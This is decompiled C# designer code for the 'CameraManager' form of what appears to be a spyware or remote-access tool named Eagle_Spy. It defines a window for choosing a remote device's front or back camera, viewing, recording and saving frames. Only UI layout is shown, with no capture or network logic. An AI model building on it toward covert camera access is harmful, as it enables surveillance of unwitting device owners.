namespace Eagle_Spy
{
	// Token: 0x0200002C RID: 44
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class CameraManager : global::System.Windows.Forms.Form
	{
		// Token: 0x0600035D RID: 861 RVA: 0x0004DD70 File Offset: 0x0004BF70
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x0600035E RID: 862 RVA: 0x0004DDB0 File Offset: 0x0004BFB0
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.CAM0 = new global::System.Windows.Forms.PictureBox();
			this.Frames = new global::System.Windows.Forms.Timer(this.components);
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.qultytext = new global::System.Windows.Forms.Label();
			this.combotext = new global::System.Windows.Forms.Label();
			this.comboqualty = new global::DrakeUI.Framework.DrakeUIComboBox();
			this.combosizes = new global::DrakeUI.Framework.DrakeUIComboBox();
			this.Panel3 = new global::System.Windows.Forms.Panel();
			this.pinbtn = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.hidetoolbtn = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.Button3 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.Sbtn = new global::DrakeUI.Framework.DrakeUIButton();
			this.startbtn = new global::DrakeUI.Framework.DrakeUIButton();
			this.DrakeUIAvatar2 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.DrakeUILampLED1 = new global::DrakeUI.Framework.DrakeUILampLED();
			this.combocam = new global::DrakeUI.Framework.DrakeUIComboBox();
			this.drakeUIButtonIcon2 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.ClientPic = new global::System.Windows.Forms.PictureBox();
			this.drakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.fpstext = new global::System.Windows.Forms.Label();
			this.Panel4 = new global::System.Windows.Forms.Panel();
			this.statustext = new global::System.Windows.Forms.Label();
			this.Label2 = new global::System.Windows.Forms.Label();
			this.cmbofoucs = new global::System.Windows.Forms.ComboBox();
			this.Label1 = new global::System.Windows.Forms.Label();
			this.Panel2 = new global::System.Windows.Forms.Panel();
			this.ToolTip1 = new global::System.Windows.Forms.ToolTip(this.components);
			this.DrakeUIToolTip1 = new global::DrakeUI.Framework.DrakeUIToolTip(this.components);
			this.savetimer = new global::System.Windows.Forms.Timer(this.components);
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			((global::System.ComponentModel.ISupportInitialize)this.CAM0).BeginInit();
			this.Panel1.SuspendLayout();
			this.Panel3.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
			this.Panel4.SuspendLayout();
			this.Panel2.SuspendLayout();
			base.SuspendLayout();
			this.CAM0.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.CAM0.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.CAM0.Location = new global::System.Drawing.Point(0, 0);
			this.CAM0.Name = "CAM0";
			this.CAM0.Size = new global::System.Drawing.Size(605, 571);
			this.CAM0.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.CAM0.TabIndex = 0;
			this.CAM0.TabStop = false;
			this.CAM0.MouseLeave += new global::System.EventHandler(this.CAM0_MouseLeave);
			this.CAM0.MouseHover += new global::System.EventHandler(this.CAM0_MouseHover);
			this.Frames.Interval = 1000;
			this.Frames.Tick += new global::System.EventHandler(this.Frames_Tick);
			this.TOpacity.Interval = 1;
			this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
			this.Panel1.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.Panel1.Controls.Add(this.qultytext);
			this.Panel1.Controls.Add(this.combotext);
			this.Panel1.Controls.Add(this.comboqualty);
			this.Panel1.Controls.Add(this.combosizes);
			this.Panel1.Controls.Add(this.CAM0);
			this.Panel1.Controls.Add(this.Panel3);
			this.Panel1.Controls.Add(this.Sbtn);
			this.Panel1.Controls.Add(this.startbtn);
			this.Panel1.Location = new global::System.Drawing.Point(0, 67);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(615, 571);
			this.Panel1.TabIndex = 3;
			this.qultytext.Font = new global::System.Drawing.Font("Calibri", 8.7f, global::System.Drawing.FontStyle.Bold);
			this.qultytext.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.qultytext.Location = new global::System.Drawing.Point(859, 404);
			this.qultytext.Name = "qultytext";
			this.qultytext.Size = new global::System.Drawing.Size(78, 28);
			this.qultytext.TabIndex = 42;
			this.qultytext.Text = "Quality";
			this.qultytext.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.combotext.Font = new global::System.Drawing.Font("Calibri", 8.7f, global::System.Drawing.FontStyle.Bold);
			this.combotext.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.combotext.Location = new global::System.Drawing.Point(873, 378);
			this.combotext.Name = "combotext";
			this.combotext.Size = new global::System.Drawing.Size(65, 26);
			this.combotext.TabIndex = 40;
			this.combotext.Text = "Size";
			this.combotext.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.comboqualty.DropDownStyle = global::DrakeUI.Framework.UIDropDownStyle.DropDownList;
			this.comboqualty.FillColor = global::System.Drawing.Color.Black;
			this.comboqualty.Font = new global::System.Drawing.Font("Calibri", 9f);
			this.comboqualty.ForeColor = global::System.Drawing.Color.White;
			this.comboqualty.Items.AddRange(new object[] { "10", "20", "30", "40", "50", "60", "70", "80", "90", "100" });
			this.comboqualty.Location = new global::System.Drawing.Point(855, 319);
			this.comboqualty.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.comboqualty.MaxDropDownItems = 25;
			this.comboqualty.MinimumSize = new global::System.Drawing.Size(63, 0);
			this.comboqualty.Name = "comboqualty";
			this.comboqualty.Padding = new global::System.Windows.Forms.Padding(0, 0, 30, 0);
			this.comboqualty.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.comboqualty.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.comboqualty.Size = new global::System.Drawing.Size(82, 22);
			this.comboqualty.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.comboqualty.StyleCustomMode = true;
			this.comboqualty.TabIndex = 43;
			this.comboqualty.Text = "70";
			this.comboqualty.TextAlignment = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.combosizes.DropDownStyle = global::DrakeUI.Framework.UIDropDownStyle.DropDownList;
			this.combosizes.FillColor = global::System.Drawing.Color.Black;
			this.combosizes.Font = new global::System.Drawing.Font("Calibri", 9f);
			this.combosizes.ForeColor = global::System.Drawing.Color.White;
			this.combosizes.Location = new global::System.Drawing.Point(822, 351);
			this.combosizes.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.combosizes.MaxDropDownItems = 25;
			this.combosizes.MinimumSize = new global::System.Drawing.Size(63, 0);
			this.combosizes.Name = "combosizes";
			this.combosizes.Padding = new global::System.Windows.Forms.Padding(0, 0, 30, 0);
			this.combosizes.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.combosizes.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.combosizes.Size = new global::System.Drawing.Size(115, 22);
			this.combosizes.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.combosizes.StyleCustomMode = true;
			this.combosizes.TabIndex = 41;
			this.combosizes.TextAlignment = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.Panel3.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.Panel3.Controls.Add(this.pinbtn);
			this.Panel3.Controls.Add(this.hidetoolbtn);
			this.Panel3.Controls.Add(this.Button3);
			this.Panel3.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.Panel3.Location = new global::System.Drawing.Point(605, 0);
			this.Panel3.Name = "Panel3";
			this.Panel3.Size = new global::System.Drawing.Size(10, 571);
			this.Panel3.TabIndex = 30;
			this.pinbtn.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.pinbtn.BackColor = global::System.Drawing.Color.Transparent;
			this.pinbtn.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.pinbtn.FillColor = global::System.Drawing.Color.Transparent;
			this.pinbtn.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.pinbtn.ForeColor = global::System.Drawing.Color.Red;
			this.pinbtn.Location = new global::System.Drawing.Point(-39, 437);
			this.pinbtn.Name = "pinbtn";
			this.pinbtn.RectColor = global::System.Drawing.Color.Transparent;
			this.pinbtn.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.pinbtn.Size = new global::System.Drawing.Size(34, 25);
			this.pinbtn.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.pinbtn.Symbol = 61581;
			this.pinbtn.SymbolSize = 30;
			this.pinbtn.TabIndex = 29;
			this.pinbtn.TagString = "s";
			this.DrakeUIToolTip1.SetToolTip(this.pinbtn, "PIN");
			this.pinbtn.Click += new global::System.EventHandler(this.DrakeUIButtonIcon1_Click_1);
			this.hidetoolbtn.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.hidetoolbtn.BackColor = global::System.Drawing.Color.Transparent;
			this.hidetoolbtn.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.hidetoolbtn.FillColor = global::System.Drawing.Color.Transparent;
			this.hidetoolbtn.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.hidetoolbtn.ForeColor = global::System.Drawing.Color.Red;
			this.hidetoolbtn.Location = new global::System.Drawing.Point(-39, 468);
			this.hidetoolbtn.Name = "hidetoolbtn";
			this.hidetoolbtn.RectColor = global::System.Drawing.Color.Transparent;
			this.hidetoolbtn.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.hidetoolbtn.Size = new global::System.Drawing.Size(34, 25);
			this.hidetoolbtn.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.hidetoolbtn.Symbol = 61550;
			this.hidetoolbtn.SymbolSize = 30;
			this.hidetoolbtn.TabIndex = 2;
			this.hidetoolbtn.TagString = "s";
			this.DrakeUIToolTip1.SetToolTip(this.hidetoolbtn, "Hide/Show Tools");
			this.hidetoolbtn.Click += new global::System.EventHandler(this.DrakeUIButtonIcon1_Click);
			this.Button3.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.Button3.AvatarSize = 30;
			this.Button3.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button3.FillColor = global::System.Drawing.Color.Black;
			this.Button3.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.Button3.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.Button3.Location = new global::System.Drawing.Point(-39, 536);
			this.Button3.Margin = new global::System.Windows.Forms.Padding(4);
			this.Button3.Name = "Button3";
			this.Button3.Size = new global::System.Drawing.Size(34, 28);
			this.Button3.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Button3.StyleCustomMode = true;
			this.Button3.Symbol = 61469;
			this.Button3.SymbolSize = 30;
			this.Button3.TabIndex = 26;
			this.Button3.Tag = "off";
			this.Button3.Text = "DrakeUIAvatar1";
			this.DrakeUIToolTip1.SetToolTip(this.Button3, "Record");
			this.Button3.Click += new global::System.EventHandler(this.Addpo_Click);
			this.Sbtn.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Sbtn.Enabled = false;
			this.Sbtn.FillColor = global::System.Drawing.Color.Black;
			this.Sbtn.FillDisableColor = global::System.Drawing.Color.FromArgb(25, 25, 25);
			this.Sbtn.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.Sbtn.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.Sbtn.Location = new global::System.Drawing.Point(851, 283);
			this.Sbtn.Name = "Sbtn";
			this.Sbtn.Radius = 15;
			this.Sbtn.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.Sbtn.RectDisableColor = global::System.Drawing.Color.White;
			this.Sbtn.Size = new global::System.Drawing.Size(87, 28);
			this.Sbtn.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Sbtn.TabIndex = 20;
			this.Sbtn.Text = "Stop";
			this.DrakeUIToolTip1.SetToolTip(this.Sbtn, "Stop Camera");
			this.Sbtn.Click += new global::System.EventHandler(this.DrakeUIButton2_Click);
			this.startbtn.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.startbtn.FillColor = global::System.Drawing.Color.Black;
			this.startbtn.FillDisableColor = global::System.Drawing.Color.FromArgb(25, 25, 25);
			this.startbtn.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.startbtn.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.startbtn.Location = new global::System.Drawing.Point(851, 249);
			this.startbtn.Name = "startbtn";
			this.startbtn.Radius = 15;
			this.startbtn.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.startbtn.RectDisableColor = global::System.Drawing.Color.White;
			this.startbtn.Size = new global::System.Drawing.Size(87, 28);
			this.startbtn.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.startbtn.StyleCustomMode = true;
			this.startbtn.TabIndex = 44;
			this.startbtn.Text = "Start";
			this.DrakeUIToolTip1.SetToolTip(this.startbtn, "Stop Camera");
			this.startbtn.Click += new global::System.EventHandler(this.DrakeUIButton1_Click_3);
			this.DrakeUIAvatar2.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.DrakeUIAvatar2.AvatarSize = 30;
			this.DrakeUIAvatar2.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.DrakeUIAvatar2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIAvatar2.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.DrakeUIAvatar2.Font = new global::System.Drawing.Font("Calibri", 9f);
			this.DrakeUIAvatar2.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.DrakeUIAvatar2.Location = new global::System.Drawing.Point(533, 27);
			this.DrakeUIAvatar2.Margin = new global::System.Windows.Forms.Padding(4);
			this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
			this.DrakeUIAvatar2.Size = new global::System.Drawing.Size(34, 28);
			this.DrakeUIAvatar2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIAvatar2.StyleCustomMode = true;
			this.DrakeUIAvatar2.Symbol = 61470;
			this.DrakeUIAvatar2.SymbolSize = 25;
			this.DrakeUIAvatar2.TabIndex = 28;
			this.DrakeUIAvatar2.Tag = "off";
			this.DrakeUIAvatar2.Text = "DrakeUIAvatar1";
			this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Rotate");
			this.DrakeUIAvatar2.Click += new global::System.EventHandler(this.DrakeUIAvatar2_Click);
			this.DrakeUILampLED1.Color = global::System.Drawing.Color.Lime;
			this.DrakeUILampLED1.Enabled = false;
			this.DrakeUILampLED1.Location = new global::System.Drawing.Point(495, 24);
			this.DrakeUILampLED1.Name = "DrakeUILampLED1";
			this.DrakeUILampLED1.Size = new global::System.Drawing.Size(31, 27);
			this.DrakeUILampLED1.TabIndex = 22;
			this.DrakeUILampLED1.Text = "DrakeUILampLED1";
			this.DrakeUIToolTip1.SetToolTip(this.DrakeUILampLED1, "Saving...");
			this.DrakeUILampLED1.Visible = false;
			this.combocam.DropDownStyle = global::DrakeUI.Framework.UIDropDownStyle.DropDownList;
			this.combocam.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.combocam.Font = new global::System.Drawing.Font("Century Schoolbook", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.combocam.ForeColor = global::System.Drawing.Color.White;
			this.combocam.Items.AddRange(new object[] { "Front", "Back" });
			this.combocam.Location = new global::System.Drawing.Point(349, 24);
			this.combocam.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.combocam.MaxDropDownItems = 25;
			this.combocam.MinimumSize = new global::System.Drawing.Size(63, 0);
			this.combocam.Name = "combocam";
			this.combocam.Padding = new global::System.Windows.Forms.Padding(0, 0, 30, 0);
			this.combocam.RectColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.combocam.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.combocam.Size = new global::System.Drawing.Size(125, 27);
			this.combocam.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.combocam.StyleCustomMode = true;
			this.combocam.TabIndex = 45;
			this.combocam.Text = "Front";
			this.combocam.TextAlignment = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.drakeUIButtonIcon2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon2.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.FillDisableColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.FillHoverColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.FillPressColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.FillSelectedColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.Font = new global::System.Drawing.Font("Arial Rounded MT Bold", 9f);
			this.drakeUIButtonIcon2.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon2.ForeDisableColor = global::System.Drawing.Color.Red;
			this.drakeUIButtonIcon2.ForeHoverColor = global::System.Drawing.Color.Blue;
			this.drakeUIButtonIcon2.ForePressColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon2.ForeSelectedColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon2.ImageAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.drakeUIButtonIcon2.Location = new global::System.Drawing.Point(256, 18);
			this.drakeUIButtonIcon2.Name = "drakeUIButtonIcon2";
			this.drakeUIButtonIcon2.RadiusSides = global::DrakeUI.Framework.UICornerRadiusSides.None;
			this.drakeUIButtonIcon2.RectColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon2.RectDisableColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon2.RectHoverColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon2.RectPressColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon2.RectSelectedColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon2.RectSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
			this.drakeUIButtonIcon2.Size = new global::System.Drawing.Size(77, 43);
			this.drakeUIButtonIcon2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon2.Symbol = 61764;
			this.drakeUIButtonIcon2.SymbolSize = 30;
			this.drakeUIButtonIcon2.TabIndex = 53;
			this.drakeUIButtonIcon2.Text = "START";
			this.drakeUIButtonIcon2.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
			this.drakeUIButtonIcon2.TipsFont = new global::System.Drawing.Font("Bahnschrift", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.drakeUIButtonIcon2.Click += new global::System.EventHandler(this.drakeUIButtonIcon2_Click);
			this.ClientPic.BackColor = global::System.Drawing.Color.Transparent;
			this.ClientPic.Location = new global::System.Drawing.Point(33, 24);
			this.ClientPic.Name = "ClientPic";
			this.ClientPic.Size = new global::System.Drawing.Size(48, 39);
			this.ClientPic.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.ClientPic.TabIndex = 11;
			this.ClientPic.TabStop = false;
			this.drakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon1.FillColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon1.FillDisableColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon1.FillPressColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon1.FillSelectedColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon1.Font = new global::System.Drawing.Font("Arial Rounded MT Bold", 9f);
			this.drakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon1.ForeDisableColor = global::System.Drawing.Color.Red;
			this.drakeUIButtonIcon1.ForeHoverColor = global::System.Drawing.Color.Blue;
			this.drakeUIButtonIcon1.ForePressColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon1.ForeSelectedColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon1.ImageAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.drakeUIButtonIcon1.Location = new global::System.Drawing.Point(160, 18);
			this.drakeUIButtonIcon1.Name = "drakeUIButtonIcon1";
			this.drakeUIButtonIcon1.RadiusSides = global::DrakeUI.Framework.UICornerRadiusSides.None;
			this.drakeUIButtonIcon1.RectColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.Black;
			this.drakeUIButtonIcon1.RectSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
			this.drakeUIButtonIcon1.Size = new global::System.Drawing.Size(69, 43);
			this.drakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon1.Symbol = 62091;
			this.drakeUIButtonIcon1.SymbolSize = 30;
			this.drakeUIButtonIcon1.TabIndex = 52;
			this.drakeUIButtonIcon1.Text = "STOP";
			this.drakeUIButtonIcon1.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
			this.drakeUIButtonIcon1.TipsFont = new global::System.Drawing.Font("Bahnschrift", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.drakeUIButtonIcon1.Click += new global::System.EventHandler(this.drakeUIButtonIcon1_Click_2);
			this.fpstext.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.fpstext.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.fpstext.Font = new global::System.Drawing.Font("Calibri", 8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.fpstext.ForeColor = global::System.Drawing.Color.Lime;
			this.fpstext.Location = new global::System.Drawing.Point(0, 0);
			this.fpstext.Name = "fpstext";
			this.fpstext.Size = new global::System.Drawing.Size(618, 64);
			this.fpstext.TabIndex = 1;
			this.fpstext.Text = "...";
			this.fpstext.UseMnemonic = false;
			this.fpstext.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.fpstext_MouseDown);
			this.Panel4.BackColor = global::System.Drawing.Color.Black;
			this.Panel4.Controls.Add(this.statustext);
			this.Panel4.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Panel4.Location = new global::System.Drawing.Point(0, 625);
			this.Panel4.Name = "Panel4";
			this.Panel4.Size = new global::System.Drawing.Size(618, 16);
			this.Panel4.TabIndex = 1;
			this.statustext.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.statustext.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.statustext.Font = new global::System.Drawing.Font("Calibri", 8.7f);
			this.statustext.ForeColor = global::System.Drawing.Color.Lime;
			this.statustext.Location = new global::System.Drawing.Point(0, 0);
			this.statustext.Name = "statustext";
			this.statustext.Size = new global::System.Drawing.Size(618, 16);
			this.statustext.TabIndex = 15;
			this.statustext.Text = "Select Camera ...";
			this.Label2.AutoSize = true;
			this.Label2.BackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
			this.Label2.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Bold);
			this.Label2.ForeColor = global::System.Drawing.Color.FromArgb(95, 95, 250);
			this.Label2.Location = new global::System.Drawing.Point(426, 215);
			this.Label2.Name = "Label2";
			this.Label2.Size = new global::System.Drawing.Size(42, 17);
			this.Label2.TabIndex = 15;
			this.Label2.Text = "Focus";
			this.cmbofoucs.BackColor = global::System.Drawing.Color.Black;
			this.cmbofoucs.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.cmbofoucs.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.cmbofoucs.ForeColor = global::System.Drawing.Color.White;
			this.cmbofoucs.Items.AddRange(new object[] { "Yes", "No" });
			this.cmbofoucs.Location = new global::System.Drawing.Point(337, 213);
			this.cmbofoucs.Name = "cmbofoucs";
			this.cmbofoucs.Size = new global::System.Drawing.Size(83, 21);
			this.cmbofoucs.TabIndex = 16;
			this.Label1.AutoSize = true;
			this.Label1.BackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
			this.Label1.Font = new global::System.Drawing.Font("Calibri", 10f, global::System.Drawing.FontStyle.Bold);
			this.Label1.ForeColor = global::System.Drawing.Color.FromArgb(95, 95, 250);
			this.Label1.Location = new global::System.Drawing.Point(426, 176);
			this.Label1.Name = "Label1";
			this.Label1.Size = new global::System.Drawing.Size(48, 17);
			this.Label1.TabIndex = 14;
			this.Label1.Text = "Qualty";
			this.Panel2.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.Panel2.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Zoom;
			this.Panel2.Controls.Add(this.Label2);
			this.Panel2.Controls.Add(this.cmbofoucs);
			this.Panel2.Controls.Add(this.Label1);
			this.Panel2.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Panel2.Location = new global::System.Drawing.Point(0, 614);
			this.Panel2.Name = "Panel2";
			this.Panel2.Size = new global::System.Drawing.Size(618, 11);
			this.Panel2.TabIndex = 1;
			this.ToolTip1.BackColor = global::System.Drawing.Color.FromArgb(35, 35, 35);
			this.ToolTip1.ForeColor = global::System.Drawing.Color.DarkTurquoise;
			this.DrakeUIToolTip1.BackColor = global::System.Drawing.Color.FromArgb(54, 54, 54);
			this.DrakeUIToolTip1.ForeColor = global::System.Drawing.Color.FromArgb(239, 239, 239);
			this.DrakeUIToolTip1.OwnerDraw = true;
			this.savetimer.Tick += new global::System.EventHandler(this.Savetimer_Tick);
			this.guna2BorderlessForm1.BorderRadius = 15;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(570, 0);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 54;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			base.ClientSize = new global::System.Drawing.Size(618, 641);
			base.Controls.Add(this.guna2ControlBox1);
			base.Controls.Add(this.drakeUIButtonIcon1);
			base.Controls.Add(this.ClientPic);
			base.Controls.Add(this.DrakeUIAvatar2);
			base.Controls.Add(this.Panel1);
			base.Controls.Add(this.DrakeUILampLED1);
			base.Controls.Add(this.Panel2);
			base.Controls.Add(this.combocam);
			base.Controls.Add(this.Panel4);
			base.Controls.Add(this.drakeUIButtonIcon2);
			base.Controls.Add(this.fpstext);
			this.Font = new global::System.Drawing.Font("Calibri", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			this.MaximumSize = new global::System.Drawing.Size(618, 641);
			this.MinimumSize = new global::System.Drawing.Size(618, 641);
			base.Name = "CameraManager";
			base.Opacity = 0.0;
			this.Text = "CameraManager";
			base.TopMost = true;
			base.Load += new global::System.EventHandler(this.CameraManager_Load);
			((global::System.ComponentModel.ISupportInitialize)this.CAM0).EndInit();
			this.Panel1.ResumeLayout(false);
			this.Panel3.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
			this.Panel4.ResumeLayout(false);
			this.Panel2.ResumeLayout(false);
			this.Panel2.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x040002D8 RID: 728
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040002F0 RID: 752
		internal global::System.Windows.Forms.PictureBox CAM0;

		// Token: 0x040002F1 RID: 753
		internal global::System.Windows.Forms.Timer Frames;

		// Token: 0x040002F2 RID: 754
